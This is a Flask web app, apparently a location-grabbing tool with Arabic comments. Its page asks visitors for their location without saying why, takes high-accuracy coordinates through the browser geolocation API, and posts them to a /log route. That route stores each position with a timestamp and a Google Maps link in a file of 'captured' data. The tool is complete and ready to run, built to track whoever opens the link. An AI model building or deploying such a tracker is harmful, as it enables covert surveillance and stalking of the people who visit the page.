from flask import Flask, request, render_template_string
import json
import os
import time

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🌍 We need your location</h2>
        <p id="result">Requesting location access...</p>
    </div>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        document.getElementById('result').innerHTML =
                            "Location received successfully!";
                        document.getElementById('result').className = 'success';

                        fetch('/log', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                lat: lat,
                                lon: lon,
                                accuracy: accuracy
                            })
                        });
                    },
                    (error) => {
                        document.getElementById('result').innerHTML =
                            "Location access denied!";
                        document.getElementById('result').className = 'error';
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById('result').innerHTML =
                    "Geolocation not supported.";
                document.getElementById('result').className = 'error';
            }
        };
    </script>
</body>
</html>
"""

# ملف حفظ البيانات
DATA_FILE = 'data.json'
captured_data = []

# تحميل بيانات قديمة إن وُجدت
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        captured_data = json.load(f)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/log', methods=['POST'])
def log_location():
    data = request.get_json()
    lat = data.get('lat')
    lon = data.get('lon')
    accuracy = data.get('accuracy')

    maps_url = f"https://maps.google.com/?q={lat},{lon}&z=18"

    entry = {
        'latitude': lat,
        'longitude': lon,
        'accuracy_m': accuracy,
        'maps_url': maps_url,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }

    captured_data.append(entry)

    with open(DATA_FILE, 'w') as f:
        json.dump(captured_data, f, indent=4)

    print("📍 New location saved:", entry)
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
